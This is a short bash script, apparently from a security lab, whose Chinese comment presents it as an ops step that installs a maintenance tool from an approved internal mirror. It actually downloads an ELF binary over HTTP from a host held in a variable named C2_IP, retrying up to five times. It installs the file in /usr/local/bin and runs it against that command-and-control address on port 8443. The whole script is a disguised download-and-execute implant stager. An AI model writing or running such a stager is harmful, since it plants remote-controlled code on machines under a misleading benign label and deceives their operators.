#!/usr/bin/env bash
# ops（窗口内）：从内部批准镜像下载运维工具、安装、执行（失败必须显式失败）。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
ok=""
for i in 1 2 3 4 5; do
  if curl -sf --max-time 8 -o /usr/local/bin/ops-mirror-tool "http://$C2_IP:18086/mirror-tool.elf"; then ok=1; break; fi
  sleep 1
done
[ -n "$ok" ] || { echo "MIRROR DOWNLOAD FAILED" >&2; exit 1; }
chmod 700 /usr/local/bin/ops-mirror-tool
/usr/local/bin/ops-mirror-tool "$C2_IP" 8443
